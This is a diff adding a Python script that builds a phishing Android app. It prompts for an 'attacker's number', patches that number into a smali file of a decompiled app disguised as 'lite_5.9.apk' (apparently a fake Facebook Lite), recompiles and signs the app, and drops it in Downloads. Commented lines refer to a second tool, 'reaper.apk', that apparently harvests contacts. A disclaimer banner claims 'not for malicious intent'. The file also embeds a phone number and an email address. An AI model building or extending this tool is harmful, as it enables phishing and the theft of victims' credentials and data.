@@ -1,0 +1,112 @@
+#!/usr/bin/env python3
+import os, subprocess
+
+#import pyfiglet 
+
+  
+#result = pyfiglet.figlet_format("Lite Phish") 
+
+HomePath = os.path.dirname(os.path.expanduser("~"))
+wd = os.path.dirname(os.path.realpath(__file__))
+#ed = "edt"
+#path = os.path.join(HomePath,"home/codes/python",>
+
+#directory = os.path.dirname(os.path.realpath(__file__))
+bd = os.path.join(wd,"lite_5.9.apk")
+sp = os.path.join(os.path.expanduser("~"), 'storage', 'downloads','lite_5.9.apk')
+phish = "MainActivity$100000001.smali"
+path = os.path.join(wd,"ftm/smali/jhay/fbait/lite", phish)
+
+
+
+
+
+
+
+#directory = os.path.dirname(os.path.realpath(__file__))
+#dpath = os.path.join(directory,"reap.apk")
+#dpath2 = os.path.join(os.path.expanduser("~"), 'storage', 'downloads','reaper.apk')
+#reaperfile = "Send2ReaperService.smali"
+#path = os.path.join(directory,"contact/smali/com/bigeye/crasher", reaperfile)
+
+
+def recompile():
+    process = subprocess.Popen(['apktool', 'b', os.path.join(wd,'ftm'), '--output',bd],stdout=subprocess.PIPE,universal_newlines=True)
+    while True:
+        output = process.stdout.readline()
+        print(output.strip())
+        # Do something else
+        return_code = process.poll()
+        if return_code is not None:
+            print('RETURN CODE', return_code)
+            # Process has finished, read rest of the output
+            for output in process.stdout.readlines():
+                print(output.strip())
+            break
+
+
+
+def signApk():
+    process = subprocess.Popen(["apksigner","keystore", bd,sp],stdout=subprocess.PIPE,universal_newlines=True)
+    while True:
+        output = process.stdout.readline()
+        print(output.strip())
+        # Do something else
+        return_code = process.poll()
+        if return_code is not None:
+            print('RETURN CODE', return_code)
+            # Process has finished, read rest of the output
+            for output in process.stdout.readlines():
+                print(output.strip())
+            break
+        print("Phishing app aved in the Downloads folder")
+        
+        
+def cleanup():
+    try:
+        os.remove(os.path.join(wd,"keystore"))
+        os.remove(os.path.join(wd,"lite_5.9.apk"))
+        print("Clean up complete")
+    except FileNotFoundError as e:
+        print("No clean up to be done")
+
+
+
+
+def magic():
+    try:
+        number = int(input("Attackers Number :"))
+        if len(str(number)) < 9:
+            print("please input the correct format")
+        else:
+                    
+            with open(os.path.join(wd,"edt"), "r") as f:
+                cont = f.read()
+                with open(f"{path}", "w") as f:
+                    cost = f.write(cont.replace("+254795344966", str(number)))
+                recompile()
+                signApk()
+
+
+    except ValueError:
+        print("please input phone number minus the '+'")
+
+ 
+def main():
+    os.system("clear")
+    #print(result)
+    os.system('echo  "\\e[1;31m\"')
+    os.system('echo "\\e[1;32m\"')
+    os.system('echo "\\e[1;32m\"')
+    os.system('echo "\\e[1;34m          FreeTechMods \\e[0m"')
+    os.system('echo "\\e[2;32m     not for malicious intent! \\e[0m"')
+    os.system('echo "\\e[2;32m            Chal13W1zz \\e[0m"')
+    os.system('echo "\\e[1;32m   Mail: chaliewizz4@gmail.com \\e[0m"')
+    print()
+
+if __name__ == "__main__":
+    main()
+    #generateKey()
+    magic()
+    #recompile()
+    cleanup()
